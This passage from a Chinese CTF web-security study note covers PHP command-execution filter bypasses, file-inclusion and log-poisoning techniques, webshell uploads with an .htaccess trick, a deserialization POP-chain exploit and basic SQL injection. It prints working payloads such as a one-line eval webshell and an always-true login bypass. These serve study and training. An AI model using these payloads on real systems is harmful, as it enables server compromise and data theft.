  echo &quot;?wllm=(~&quot;.urlencode(~$code1).&quot;)(~&quot;.urlencode(~$code2).&quot;);&quot;;
  ?&gt; 
</code></pre>
<ul>
<li><pre><code class="linux">$(())
$((~$(())))=-1
$&#123;_&#125; =&quot;&quot;返回上一次命令
</code></pre>
</li>
</ul>
<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><pre><code class="python">valid = &quot;1234567890!@$%^*()&#123;&#125;[];\&#39;\&quot;,.&lt;&gt;/?-=_`~ &quot;

answer = str(input(&quot;&quot;))#请输入进行异或构造的字符串

tmp1, tmp2 = &#39;&#39;, &#39;&#39;
for c in answer:
  for i in valid:
    for j in valid:
      if (ord(i) ^ ord(j) == ord(c)):
        tmp1 += i
        tmp2 += j
        break
    else:
      continue
    break
print(&quot;tmp1为:&quot;,tmp1)
print(&quot;tmp2为:&quot;,tmp2)
</code></pre>
<h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><ul>
<li><pre><code class="php">$_++=1
</code></pre>
<p><code>$_++</code>对<code>_</code>变量进行了自增操作,由于我们没有定义<code>_</code>的值,PHP会给<code>_</code>赋一个默认值NULL&#x3D;&#x3D;0,</p>
<p>由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字</p>
<ul>
<li>注：linux命令下不能构造<code>($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)+($__++)</code>类似语句获取数字</li>
</ul>
</li>
<li><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为”Array”</p>
<pre><code class="php">&quot;A&quot;++ ==&gt; &quot;B&quot;
&quot;B&quot;++ ==&gt; &quot;C&quot;
    如果我们能够得到&quot;A&quot;，那么我们就能通过自增自减，得到所有的字母
    
$_=[].&#39;&#39;;   //得到&quot;Array&quot;
$___ = $_[$__];   //得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;
</code></pre>
</li>
</ul>
<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html"><code>$</code>和<code>_</code>均被过滤的情况</a>(P神文章)</p>
</blockquote>
<ul>
<li><p>使用bin下的base64命令</p>
<pre><code class="linux">?c=/???/????64 ????????
</code></pre>
</li>
</ul>
<blockquote>
<p>临时文件目录：</p>
<p>Linux临时文件主要存储在&#x2F;tmp&#x2F;目录下，格式通常是（&#x2F;tmp&#x2F;php[6个随机字符]）</p>
<p>Windows临时文件主要存储在C:&#x2F;Windows&#x2F;目录下，格式通常是（C:&#x2F;Windows&#x2F;php[4个随机字符].tmp）</p>
<p>大概就是在自己的vps上写一个命令执行的txt，然后在题目post该命令</p>
</blockquote>
<ul>
<li><p>PHP5</p>
<ul>
<li><p>要点：</p>
<ol>
<li>shell下可以利用<code>.</code>来执行任意脚本</li>
<li>Linux文件名支持用glob通配符代替</li>
</ol>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">思路</a>：</p>
<p>通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）<br>注意：通过.去执行sh命令不需要有执行权限</p>
</li>
<li><p>操作：</p>
<ol>
<li><p>本地服务器构造POST上传文件数据包</p>
<pre><code class="php+HTML">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;POST数据包POC&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=&quot;http://7f21b48d-249b-4f0e-8c3e-5be2fae43b59.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
&lt;!--链接是当前打开的题目链接--&gt;
    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
</li>
<li><p>抓包构造执行命令,在上传文件内容添加sh命令</p>
<pre><code class="linux">?c=.+/???/????????[@-[]（通配符匹配大写字母）
</code></pre>
<pre><code class="linux">文件内容
#!/bin/sh
ls
</code></pre>
</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h3><p>1.利用dnslog带外</p>
<p>2.写马</p>
<p>3.反弹shell</p>
<p>4.写文件然后访问文件</p>
<h3 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h3><blockquote>
<p>依靠传入没有参数的函数套娃就可以达到命令执行的效果</p>
</blockquote>
<p>核心</p>
<pre><code class="php">if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    
    eval($_GET[&#39;code&#39;]);
&#125;
</code></pre>
<ul>
<li><p><strong>php函数直接读取文件</strong></p>
<pre><code class="php">payload例
    highlight_file(next(array_reverse(scandir(current(localeconv())))));
</code></pre>
<ul>
<li><p><strong>localeconv()函数</strong></p>
<blockquote>
<p>返回一包含本地数字及货币格式信息的数组</p>
</blockquote>
<p>第一个返回的是点，可利用的点就是代表当前目录，可以结合其他函数进行目录扫描</p>
</li>
<li><p><strong>scandir()函数</strong></p>
<blockquote>
<p>目录扫描</p>
</blockquote>
<pre><code class="php">scandir(current(localeconv()))
    查看当前目录
</code></pre>
</li>
<li><p><strong>chdir()函数</strong></p>
<blockquote>
<p>跳目录</p>
</blockquote>
<p>向上跳就要构造chdir(‘…’)</p>
</li>
<li><p><strong>array_reverse()函数</strong></p>
<blockquote>
<p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个next()</p>
</blockquote>
</li>
<li><p><strong>highlight_file()&#x2F;show_source()函数</strong></p>
<blockquote>
<p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p>
</blockquote>
<p>被过滤时:print(file_get_contents())</p>
</li>
<li><p><strong>next()函数</strong></p>
<blockquote>
<p>表示内部指针指向数组的下一个元素，并输出</p>
</blockquote>
</li>
</ul>
</li>
<li><p>打印时flag被包含可加上<code>base64_encode()</code></p>
</li>
</ul>
<hr>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/111713495">文件包含</a></h2><hr>
<h3 id="前置-1"><a href="#前置-1" class="headerlink" title="前置"></a>前置</h3><h4 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h4><p><code>include()</code>:包含一个文件，如错误则抛出警告</p>
<p><code>include_once()</code>:包含一个文件仅一次，和上面类似</p>
<p><code>require()</code>:包含一个文件，如错误则报错并停止脚本</p>
<p><code>require_once()</code>:包含一个文件仅一次，和上面类似</p>
<p>注：<strong>任何类型</strong>的文件，只要其中含有合法PHP代码，PHP就可以包含并执行；如果没有，就会以纯文本形式显示文件中的内容</p>
<hr>
<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议</a></h4><p><strong>php.ini配置文件参数：</strong></p>
<p><code>allow_url_fopen：on </code>#默认开启 ，表示允许url里的封装协议访问文件；</p>
<p><code>allow_url_include：off</code> #默认关闭，表示不允许包含url里的封装协议包含文件；</p>
<ul>
<li><p><em><strong>php:&#x2F;&#x2F;协议</strong></em></p>
<ul>
<li><p><strong>条件</strong>：</p>
<p><code>allow_url_fopen</code>:off&#x2F;on</p>
<p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p>
</li>
<li><p><strong>php:&#x2F;&#x2F;filter</strong></p>
<p><strong>读取文件源码</strong>可以直接用resource读取(常用)</p>
<pre><code class="php">//base64编码
php://filter/read=convert.base64-encode/resource=flag.php
//quoted-printable编码
php://filter/read=convert.quoted-printable-encode/resource=flag.php
//rot13变换
php://filter/read=string.rot13/resource=flag.php
</code></pre>
</li>
</ul>
</li>
</ul>
<p>​    </p>
<ul>
<li><p><strong>php:&#x2F;&#x2F;input</strong></p>
<p>执行php代码</p>
<p>是个可以访问请求的原始数据的只读流。（php:&#x2F;&#x2F;input可以读取没有处理过的<strong>POST数据</strong>）</p>
<p>在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p>
<ul>
<li>利用条件：<code>绕过file_get_contents()</code></li>
</ul>
</li>
<li><p><em><strong>data:&#x2F;&#x2F;协议</strong></em></p>
<p>访问数据流，执行相应php代码</p>
<p>可用于flag被过滤的文件包含</p>
<pre><code class="php">data://text/plain(;base64),编码后的php代码 
</code></pre>
</li>
<li><p><em><strong>file:&#x2F;&#x2F;协议</strong></em></p>
<p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :off&#x2F;on</li>
</ul>
</li>
</ul>
<p>​		<strong>可读取本地文件</strong></p>
<hr>
<h4 id="Apache日志文件"><a href="#Apache日志文件" class="headerlink" title="Apache日志文件"></a>Apache日志文件</h4><ul>
<li><p><strong>access.log</strong></p>
<p>记录网站的访问信息</p>
<p><code>客户端IP - - [访问时间] &quot;请求记录&quot; HTTP状态码 字节数</code></p>
</li>
<li><p><strong>error.log</strong></p>
<p>记录错误的访问信息</p>
</li>
</ul>
<blockquote>
<p>注：每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。  </p>
<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将一句话木马写入access.log日志</p>
<p>第二次发包才包含到前一次的日志中的木马。</p>
</blockquote>
<hr>
<h3 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h3><p><code>url+参数=挂马文件地址</code></p>
<h4 id="Apache日志包含漏洞-目录穿越"><a href="#Apache日志包含漏洞-目录穿越" class="headerlink" title="Apache日志包含漏洞+目录穿越"></a>Apache日志包含漏洞+目录穿越</h4><ul>
<li>使用BurpSuite发送请求，在UA头写入一句话木马，然后就可以include到当前php文件中，实现命令执行，把PHP一句话写进access.log里</li>
<li><code>../</code>返回上级目录，可以读取上级目录的access.log文件</li>
</ul>
<blockquote>
<p>注：如果不知道日志文件的地址，可以把参数设置成一个不存在的文件名，比如<code>?jumpTo=114514</code>，这样网页会报错显示网站的绝对路径  （如果没有屏蔽报错），使用了各种面板的会显示面板的错误信息，可以以此来判断日志路径。</p>
</blockquote>
<hr>
<h4 id="截断攻击"><a href="#截断攻击" class="headerlink" title="截断攻击"></a>截断攻击</h4><blockquote>
<p>PHP &lt; 5.3.4</p>
</blockquote>
<ul>
<li>场景：对传入的参数使用字符串拼接</li>
<li>在ASCII字符集中，<code>%00</code>代表的是<strong>字符串的结束</strong>，也就是说，如果在一串字符的中间插入<code>%00</code>，那么后面的字符串会被丢弃。如果把参数值改为<code>shell.jpg%00</code>，那么之后拼接的字符串将被<code>include</code>方法所丢弃。这样就能成功访问一句话木马。</li>
</ul>
<hr>
<h3 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h3><p>本质是使用<strong>PHP伪协议</strong>进行包含</p>
<ul>
<li><p>无限制：参数之后加上危险脚本的URL</p>
</li>
<li><p>有限制时截断：</p>
<ul>
<li>使用<code>?</code>绕过，<strong>问号之后的字符串会被当做查询参数丢弃</strong></li>
<li>使用<code>%20</code>绕过</li>
</ul>
</li>
<li><p>伪协议php:&#x2F;&#x2F;input控制输出流：（BurpSuite）</p>
<pre><code class="php+HTML">GET /file_include/index.php?jumpTo=php://input HTTP/1.1
Host: 127.0.0.1
......
Sec-Fetch-User: ?1

&lt;?php system(&quot;ipconfig/all&quot;); ?&gt;
</code></pre>
<p>此时把显示主机IP地址信息的命令“输入”到了PHP中</p>
</li>
</ul>
<hr>
<h3 id="日志文件include"><a href="#日志文件include" class="headerlink" title="日志文件include"></a>日志文件include</h3><p>原理：对网站进行访问时,日志文件会记录相关信息(请求头中的信息)</p>
<p>前提：知道日志文件所在,并能进行包含</p>
<ul>
<li>先访问网站在请求头中写入一句话(一般写在user-agent中)</li>
<li>然后通过post去尝试执行</li>
<li>执行成功后通过蚁剑连接得到shell</li>
</ul>
<hr>
<h3 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h3><p>通过向session传入恶意代码并访问其文件实现</p>
<h4 id="session工作原理"><a href="#session工作原理" class="headerlink" title="session工作原理"></a>session工作原理</h4><p>（1）首先使用<code>session_start()</code>函数进行初始化。</p>
<p>（2）当执行PHP脚本时，通过使用<strong>SESSION超全局变量</strong>注册session变量。</p>
<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。</p>
<ul>
<li><p><strong>session_start()</strong></p>
<p>（1）读取名为<strong>PHPSESSID</strong>（如果没有改变默认值）的cookie值，假使为abc123。</p>
<p>（2）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以在php.ini中设置）读取SESSabc123（默认是这种命名方式）文件，将字符装在入SESSION变量中；</p>
<p>（3）若没有读取到PHPSESSID这个COOKIE，也会创建SESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件，同时将abc321作为PHPSESSID的cookie值返回给浏览器端。</p>
</li>
</ul>
<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>Session Support :enable</p>
</blockquote>
<ul>
<li><p><strong>session.auto_start</strong>：如果 <code>session.auto_start=On </code>，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
<p>但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为 off。此时用户是可以自己定义 Session ID 的。</p>
<p>比如，我们在 Cookie 里设置 PHPSESSID&#x3D;a ，PHP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_a”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。</p>
</li>
<li><p><strong>session.save_path</strong>：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件</p>
</li>
<li><p><strong>session.upload_progress_enabled</strong>：当这个配置为 On 时，代表 session.upload_progress 功能开始，如果这个选项关闭，则这个方法用不了</p>
</li>
<li><p><strong>session.upload_progress_cleanup</strong>：这个选项默认也是 On，也就是说当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉；这里就给我们的操作造成了很大的困难，我们就只能使用<strong>条件竞争</strong>的方式不停的发包，争取在它被删除掉之前就成功利用</p>
</li>
<li><p><strong>session.upload_progress_name</strong>：当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控</p>
</li>
<li><p><strong>session.upload_progress_prefix</strong>：与session.upload_progress_name 将表示为 session 中的键名</p>
</li>
</ul>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p><code>$_SESSION[&quot;username&quot;]=参数</code></p>
<p>当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击。</p>
<ul>
<li>Session的存储位置获取：</li>
</ul>
<p>​	（1）通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的<strong>session.save_path</strong>存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path为<code>/var/lib/php/session</code>。</p>
<p>​	（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在<code>/var/lib/php/session</code>目录下。默认存储Session存放位置。</p>
<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><blockquote>
<p>by <a target="_blank" rel="noopener" href="https://ph0ebus.github.io/post/[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021]EasyCleanup">ph0ebus</a></p>
</blockquote>
<ul>
<li><p>目标环境开启了<code>session.upload_progress.enable</code>选项</p>
</li>
<li><p>发送一个文件上传请求，其中包含一个文件表单和一个名字是PHP_SESSION_UPLOAD_PROGRESS的字段</p>
</li>
<li><p>请求的Cookie中包含Session ID</p>
</li>
<li><p>注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。</p>
</li>
</ul>
<hr>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
<li><p><strong>调整php.ini中的不合理配置</strong></p>
<ul>
<li><strong>magic_quotes_gpc&#x3D;On</strong>，将参数中的异常字符进行转义。</li>
<li><strong>allow_url_include&#x3D;Off</strong>，禁止将URL作为文件打开处理。</li>
<li><strong>allow_url_fopen&#x3D;Off</strong>，禁止<code>include()</code>和<code>require()</code>打开URL作为文件处理</li>
</ul>
</li>
<li><p><strong>过滤异常字符</strong></p>
<p>检查参数，如果参数中含有<code>%</code>，<code>#</code>，<code>;</code>等不需要的字符，将其去掉或者拒绝请求</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyt2008/article/details/8282310"><strong>更改Apache日志路径</strong></a></p>
</li>
<li><p><strong>写死包含的路径或文件名</strong></p>
<pre><code class="php+HTML">&lt;?php
    header(&quot;Content-type:text/html;charset=utf-8&quot;);
    error_reporting(E_ERROR); 
    ini_set(&quot;display_errors&quot;,&quot;Off&quot;);
    $link=$_GET[&#39;jumpTo&#39;];
    if (isset($link)) &#123;
        switch ($link) &#123;
            case &#39;job&#39;:
                include(&#39;./jobs.php&#39;);
                break;
            case &#39;hobby&#39;:
                include(&#39;./hobby.php&#39;);
                break;
            default:
                die(&quot;风雪的缩影，如琉璃般飘落......&quot;);
                break;
        &#125;
    &#125; else &#123;
        // Do nothing.    
    &#125;
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;王小美の主页&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1 style=&quot;text-align: center;&quot;&gt;个人主页&lt;/h1&gt;
    &lt;br&gt;
    &lt;img src=&quot;./img/ganyu.png&quot;&gt;
    &lt;br&gt;
    &lt;p&gt;Name: 甘雨&lt;/p&gt;&lt;br&gt;
    &lt;p&gt;Age: 3000+&lt;/p&gt;&lt;br&gt;
    &lt;p&gt;我是女生&lt;/p&gt;&lt;br&gt;
    &lt;a href=&quot;./index.php?jumpTo=job&quot;&gt;我的工作&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;./index.php?jumpTo=hobby&quot;&gt;我的兴趣爱好&lt;/a&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
</li>
</ul>
<hr>
<h2 id="文件上传upload"><a href="#文件上传upload" class="headerlink" title="文件上传upload"></a>文件上传upload</h2><ul>
<li><p>php写一句话木马上传</p>
<pre><code class="php">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
</code></pre>
<ul>
<li>PHP环境下若php被过滤且无提示，传入**.phtml&#x2F;.php3&#x2F;.php4**的一句话木马（可当作php解析）</li>
<li>要求传图片，可写入一句话木马改成图片格式，上传时改成.php</li>
<li>php过滤可尝试改成Php</li>
</ul>
</li>
<li><p>php写&lt;?php phpinfo();?&gt;直接上传</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess</a>(环境为Apache时使用)</p>
<pre><code class="htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;

Sethandler application/x-httpd-php
#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;

Addhandler php5-script .jpg
#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;

&lt;/FilesMatch&gt;
#&lt;!-- 该种匹配方式较为精准，不会造成大批的误伤情况 --&gt;
</code></pre>
<ul>
<li>记得改Content-Type</li>
</ul>
</li>
</ul>
<hr>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/LJH1999ZN/article/details/123338591">反序列化</a></h2><p>O(对象):(类的字符长度):(类名):(项数):{s&#x2F;i(字符串&#x2F;数字):(长度):(内容);}</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code class="php">$a=new wllm()	//自定义参数实例化类
$a-&gt;admin=&quot;admin&quot;;		//调用指针指向变量或方法并赋值
$b=serialize($a);
</code></pre>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul>
<li><p>__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</p>
<ul>
<li>eval:代码执行</li>
</ul>
</li>
<li><p>__construst():具有构造函数的类在创建新对象的时候，回调此方法</p>
</li>
<li><p>__destruct():反序列化的时候，或者对象销毁的时候调用</p>
</li>
<li><p><strong>__wakeup()</strong>:反序列化的时候调用</p>
<ul>
<li>当序列化字符串中表示对象属性个数的值大于真实的属性个数会跳过_wakeup的执行（CVE-2016-7124）(版本：<strong>PHP5 &lt; 5.6.25</strong>  <strong>PHP7 &lt; 7.0.10</strong>)</li>
</ul>
</li>
<li><p>__sleep():序列化的时候调用</p>
</li>
<li><p>__toString():把类当成字符串的时候调用</p>
<ul>
<li>一般在echo处生效</li>
</ul>
</li>
<li><p>__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p>
</li>
<li><p>__get():读取不可访问或者不存在的属性的时候，进行赋值</p>
</li>
<li><p>__call():在对象中调用一个不存在或不可访问的方法的时候，会被执行</p>
</li>
</ul>
<h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/123988229?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166876201416782428623647%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166876201416782428623647&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-123988229-null-null.142%5Ev65%5Eopensearch_v2,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=pop%E9%93%BE&spm=1018.2226.3001.4187">POP链</a></h3><ul>
<li><p>public:公有的类成员可以在任何地方被访问</p>
</li>
<li><p>protected:受保护的类成员则可以被其自身以及其子类和父类访问</p>
<p>.*.</p>
</li>
<li><p>private:私有的类成员则只能被其定义所在的类访问</p>
<p>.类名.</p>
<ul>
<li><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度：即%00</p>
<p>因此需要<code>urlencode</code></p>
</li>
</ul>
</li>
<li><p>入口： __destruct()或___wakeup()</p>
</li>
<li><p>出口：__invoke()</p>
</li>
<li><p>通过this-&gt;指针调用其他类构造pop链</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.ctfer.vip/problem/440">例题源码</a></p>
<pre><code class="php"> &lt;?php

error_reporting(0);
show_source(&quot;index.php&quot;);

class w44m&#123;

    private $admin = &#39;aaa&#39;;
    protected $passwd = &#39;123456&#39;;

    public function Getflag()&#123;
        if($this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;)&#123;
            include(&#39;flag.php&#39;);
            echo $flag;
        &#125;else&#123;
            echo $this-&gt;admin;
            echo $this-&gt;passwd;
            echo &#39;nono&#39;;
        &#125;
    &#125;
&#125;

class w22m&#123;
    public $w00m;
    public function __destruct()&#123;
        echo $this-&gt;w00m;
    &#125;
&#125;

class w33m&#123;
    public $w00m;
    public $w22m;
    public function __toString()&#123;
        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();
        return 0;
    &#125;
&#125;

$w00m = $_GET[&#39;w00m&#39;];
unserialize($w00m);

?&gt; 
</code></pre>
<p>exp</p>
<pre><code class="php">&lt;?php
class w44m&#123;

    private $admin = &#39;w44m&#39;;
    protected $passwd = &#39;08067&#39;;

    public function Getflag()&#123;		//公共方法
        if($this-&gt;admin === &#39;w44m&#39; &amp;&amp; $this-&gt;passwd ===&#39;08067&#39;)&#123;
            echo $flag;
        &#125;else&#123;
            echo $this-&gt;admin;
            echo $this-&gt;passwd;
            echo &#39;nono&#39;;
        &#125;
    &#125;
&#125;

class w22m&#123;
    public $w00m;
    public function __destruct()&#123;
        echo $this-&gt;w00m;
    &#125;
&#125;

class w33m&#123;
    public $w00m;
    public $w22m = &quot;Getflag&quot;;	//指向Getflag方法
    public function __toString()&#123;
        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();
        return 0;
    &#125;
&#125;
$a=new w44m();
$b=new w22m();
$c=new w33m();
$c-&gt; w00m=$a;	//调用w33m中的w22m使其指向方法
$b-&gt; w00m=$c;   //调用w22m中的w00m使结果echo
echo urlencode(serialize($b));
?&gt;
</code></pre>
<hr>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入</a></h2><p><a target="_blank" rel="noopener" href="http://sqlwiki.radare.cn/#/injectionTypes/errorBased">wiki</a></p>
<h3 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a><a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-tutorial.html">SQL语法</a></h3><ul>
<li><p>从数据库中选取数据</p>
<p><code>SELECT column_name,column_name FROM table_name;</code>或<br><code>SELECT FROM table_name;</code></p>
<ul>
<li><p><code>select distinct</code>语句可用于返回唯一不同的值</p>
</li>
<li><p><code>SELECT FROM语句 + where column_name = value;</code>可用于提取满足指定条件的记录</p>
</li>
<li><p><code>SELECT FROM语句 + order by column_name(可多列查询 + ,column_name) ASC（升序）|DESC（降序）; </code>对结果集按照一个列或者多个列进行排序</p>
<p>1‘ order by + 字段数# 用于查询可显示的字段</p>
</li>
<li><p><code>SELECT column_name(s) FROM table1 UNION SELECT column_name(s) FROM table2;</code>合并两个或多个 SELECT 语句的结果</p>
<p>union select</p>
</li>
</ul>
</li>
<li><p><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code>将相同的行组合起来</p>
</li>
<li><p><strong>表示注释</strong>:</p>
<p>#或%23：post请求中使用</p>
<p>–+或–%20:get请求中使用（+将被识别为空格）</p>
</li>
<li><p><strong>关键字</strong></p>
<p>database():数据库</p>
<p>table_name:表名(表名为数字时：要用反引号包起来查询)</p>
<p>column_name:列名</p>
<hr>
</li>
</ul>
<h3 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h3><ul>
<li>原理：使相关语句永真</li>
</ul>
<pre><code class="sql">&#39;1&#39;or 1 = 1#
</code></pre>
<p><code>ffifdyop</code>：md5加密时使用</p>
<h3 id="位数长度不足"><a href="#位数长度不足" class="headerlink" title="位数长度不足"></a>位数长度不足</h3><p>使用截断函数</p>
<ul>
<li><strong>substr()函数</strong></li>
</ul>
<p>​	  <code>substr(string,start,length)</code><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20221207161642898.png" alt="	"></p>
<ul>
<li><p><strong>left()函数</strong></p>
<p>获得源字符串左边的子串</p>
<p><code>left(string,n)</code></p>
</li>
<li><p><strong>right()函数</strong></p>
<p>获得字符串右边的子串</p>
<p><code>right(string,n)</code></p>
</li>
<li><p><strong>mid()函数</strong></p>
<p>返回字符串的子串</p>
<p><code>mid(string,start,length)</code></p>
</li>
<li><p><strong>reverse()函数</strong></p>
</li>
</ul>
<hr>
<h3 id="过滤替换"><a href="#过滤替换" class="headerlink" title="过滤替换"></a>过滤替换</h3><ul>
<li><p>空格：&#x2F;**&#x2F;</p>
</li>
<li><p>等号：like</p>
</li>
<li><p>select…where…：</p>
<ul>
<li><p>show + datebases &#x2F; tables &#x2F; columns from table </p>
</li>
<li><p>将 select * from 列名 进行16进制编码</p>
</li>
<li><p><strong>handler</strong>:一行一行显示库中内容</p>
<pre><code class="sql">handler tablename open as `a`;(`a`为新创建的表)
handler tablename read;读出什么输出什么

handler tablename read first [where username=‘admin’];
handler `a` read next [where username=‘admin’]; – [] 中的内容意味着可加可不加
</code></pre>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h3><h3 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h3><ul>
<li><p>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入（无引号闭合）</p>
</li>
